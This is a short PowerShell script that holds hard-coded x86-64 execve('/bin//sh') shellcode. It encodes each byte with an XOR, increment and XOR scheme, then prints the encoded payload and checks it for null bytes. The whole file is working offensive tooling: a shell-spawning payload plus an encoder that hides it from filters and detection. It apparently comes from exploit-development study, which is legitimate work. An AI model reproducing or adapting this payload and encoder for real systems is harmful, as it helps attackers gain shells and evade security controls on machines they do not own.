<#
    Encoding steps:
    1. xor with 0x55
    2. increment by 1
    3. xor with 0x11
#>

# Original raw shellcode bytes
$shellcode = 0x31,0xf6,0x56,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x54,0x5f,0xf7,0xee,0xb0,0x3b,0x0f,0x05
$printFriendly = ($shellcode | ForEach-Object ToString x2) -join ',0x'
write-host "Original shellcode: 0x$printFriendly"

# Iterate through shellcode bytes and encode them
$encodedShellcode = $shellcode | % {
    $_ = $_ -bxor 0x55
    $_ = $_ + 0x1
    $_ = $_ -bxor 0x11
    Write-Output $_
}

# Print encoded shellcode
$printFriendly = ($encodedShellcode | ForEach-Object ToString x2) -join ',0x'
write-host "Encoded shellcode: 0x$printFriendly"

# Print encoded bytes size
write-host "Size: " ('0x{0:x}' -f $shellcode.count)

# Check if encoded shellcode contains null bytes
write-host "Contains NULL-bytes:" $encodedShellcode.contains(0)
